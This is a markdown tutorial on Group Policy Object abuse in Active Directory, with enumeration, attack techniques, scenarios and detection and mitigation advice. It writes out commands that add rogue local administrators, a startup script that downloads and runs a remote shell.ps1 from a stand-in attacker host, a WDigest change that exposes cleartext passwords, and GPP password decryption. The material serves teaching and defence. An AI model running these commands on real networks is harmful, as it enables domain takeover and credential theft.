# 🏗 Group Policy Object (GPO) Abuse in Active Directory

**GPO abuse** is a powerful Active Directory attack technique where attackers leverage **misconfigured Group Policy Objects** to escalate privileges, execute code on multiple machines, or establish persistence across the domain.

> Group Policies control settings for users and computers in an AD environment. If an attacker gains write access to a GPO, they can push malicious configurations to every machine the GPO applies to.

---

## 🧠 What Are Group Policy Objects?

GPOs are containers for settings that apply to:

* **Users** — desktop settings, logon scripts, software restrictions
* **Computers** — security settings, startup scripts, firewall rules

GPOs are linked to:

* **Domain** — applies to all objects
* **Organizational Units (OUs)** — applies to objects in that OU
* **Sites** — applies to objects in that AD site

```text
Domain
  └── OU=Workstations
  │     └── GPO: "Workstation Security Policy"
  └── OU=Servers
  │     └── GPO: "Server Hardening Policy"
  └── OU=Users
        └── GPO: "User Restrictions Policy"
```

---

## 🎯 Why GPO Abuse Is Dangerous

* A single GPO can affect **thousands of machines**
* GPOs run with **SYSTEM privileges** on target machines
* Changes propagate automatically (every ~90 minutes)
* Attackers can push malware, create admin accounts, or modify security settings **domain-wide**

---

## 🔍 Enumerating GPOs

### PowerView

#### List All GPOs

```powershell
Get-DomainGPO | Select-Object displayname, gpcfilesyspath, distinguishedname
```

#### Find GPOs Applied to a Computer

```powershell
Get-DomainGPO -ComputerIdentity "WS01" | Select-Object displayname
```

#### Find GPOs That Modify Local Groups

```powershell
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName, GroupMembers
```

#### Find Users with GPO Edit Rights

```powershell
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl"
} | Select-Object ObjectDN, IdentityReferenceName, ActiveDirectoryRights
```

### BloodHound

Pre-built query:

```cypher
MATCH (u)-[:GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner]->(g:GPO)
RETURN u.name, g.name
```

### CrackMapExec

```bash
crackmapexec smb 10.0.0.100 -u user -p pass -M gpp_autologin
crackmapexec smb 10.0.0.100 -u user -p pass -M gpp_password
```

---

## 🔥 GPO Abuse Techniques

---

### 1️⃣ Immediate Scheduled Task via GPO

If you can edit a GPO, you can create a scheduled task that runs on all affected machines.

#### Using SharpGPOAbuse

```powershell
SharpGPOAbuse.exe --addcomputertask --taskname "Backdoor" --author "CORP\admin" --command "cmd.exe" --arguments "/c net user hacker Password123! /add && net localgroup administrators hacker /add" --gponame "Workstation Policy"
```

This creates a local admin account on every workstation the GPO applies to.

#### Force GPO Update (from target)

```powershell
gpupdate /force
```

Or wait ~90 minutes for automatic refresh.

---

### 2️⃣ Startup/Logon Script Injection

Add a malicious script to a GPO's startup/logon scripts.

#### Where GPO Scripts Are Stored

```text
\\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\Machine\Scripts\Startup\
\\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\User\Scripts\Logon\
```

If attacker has write access to SYSVOL for that GPO:

```bash
# Drop a reverse shell script
echo "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" > startup.bat
```

Copy to:

```
\\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\Machine\Scripts\Startup\startup.bat
```

Every machine the GPO applies to will execute the script on boot.

---

### 3️⃣ Registry Modification via GPO

Push malicious registry keys:

* Disable security tools
* Enable WDigest (cleartext password storage)
* Add Run keys for persistence

#### Enable WDigest via GPO

```text
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
UseLogonCredential = 1
```

Now cleartext passwords will be stored in LSASS memory → Mimikatz can read them.

---

### 4️⃣ GPP (Group Policy Preferences) Password Exploitation

**Group Policy Preferences** historically stored encrypted passwords in XML files on SYSVOL. Microsoft published the AES key, making decryption trivial.

#### Where GPP Passwords Hide

```text
\\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\Machine\Preferences\Groups\Groups.xml
\\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\Machine\Preferences\Services\Services.xml
\\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\Machine\Preferences\Scheduledtasks\ScheduledTasks.xml
\\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\Machine\Preferences\Datasources\DataSources.xml
```

#### Find GPP Passwords

CrackMapExec:

```bash
crackmapexec smb 10.0.0.100 -u user -p pass -M gpp_password
```

Manual search:

```bash
findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml
```

PowerSploit:

```powershell
Get-GPPPassword
```

#### Decrypt GPP Password

```bash
gpp-decrypt "ENCRYPTED_CPASSWORD_HERE"
```

> Note: Microsoft patched this in MS14-025, but **existing GPP passwords remain** if not cleaned up.

---

### 5️⃣ Local Admin via GPO Restricted Groups

If attacker can modify a GPO's Restricted Groups setting:

```text
Add attacker-controlled user to "Administrators" group on all affected machines
```

This is done via the GPO's:

```
Computer Configuration → Policies → Windows Settings → Security Settings 
→ Restricted Groups
```

---

## 🧨 Realistic Attack Scenarios

---

### Scenario 1: GPO Write Permission to Domain Compromise

1. Attacker compromises `helpdesk-user` account.
2. BloodHound shows `helpdesk-user` has **GenericWrite** on "Workstation Policy" GPO.
3. GPO applies to all workstations.
4. Attacker uses SharpGPOAbuse:

   ```powershell
   SharpGPOAbuse.exe --addcomputertask --taskname "Update" --command "cmd.exe" --arguments "/c net localgroup administrators helpdesk-user /add" --gponame "Workstation Policy"
   ```

5. All workstations add `helpdesk-user` as local admin.
6. Attacker laterally moves → finds DA session → compromises domain.

---

### Scenario 2: GPP Password Discovery

1. Attacker has any valid domain account.
2. SYSVOL is readable by all domain users (default).
3. Searches for cpassword:

   ```bash
   crackmapexec smb dc01.corp.local -u user -p pass -M gpp_password
   ```

4. Finds old GPP password for `svc_backup` account.
5. Decrypts password → `Backup2019!`
6. `svc_backup` has backup operator privileges → can dump NTDS.dit.
7. Domain compromised.

---

## 📊 GPO Abuse Techniques Summary

| Technique | Impact | Stealth |
| --- | --- | --- |
| Scheduled Task | Code execution on all machines | Medium |
| Startup Script | Persistence + code execution | Medium |
| Registry Modification | Disable security / enable features | High |
| GPP Passwords | Credential theft | High (passive) |
| Restricted Groups | Add admin on all machines | Low |

---

## 🛡 Detection & Mitigation

### 🔎 Detection

* **Event ID 5136** — Directory Service Changes (GPO modification)
* **Event ID 4688** — Process creation from GPO scripts
* Monitor SYSVOL for unexpected file changes
* Alert on GPO modifications by non-admin accounts
* Monitor SharpGPOAbuse execution patterns

### 🔐 Mitigation

✅ **Audit GPO permissions** — remove unnecessary write access
✅ **Remove old GPP passwords** from SYSVOL
✅ Apply **MS14-025** patch (prevents new GPP password creation)
✅ Use **LAPS** for local admin passwords instead of GPP
✅ Enable **Advanced Audit Policy** for GPO changes
✅ Restrict who can create and link GPOs
✅ Monitor SYSVOL integrity with file monitoring tools
✅ Implement **Change Management** for all GPO modifications

---

## ⚠ Ethical Reminder

Everything discussed:

* Legal only in authorized labs
* Legal with written penetration testing authorization
* Illegal otherwise

---

## 📚 What to Learn Next

* 🔄 Combining GPO abuse with lateral movement
* 🧪 AD lab setup for practicing GPO attacks
* 🛡 GPO hardening best practices
* 🔍 Using DVAD (Damn Vulnerable Active Directory) for practice
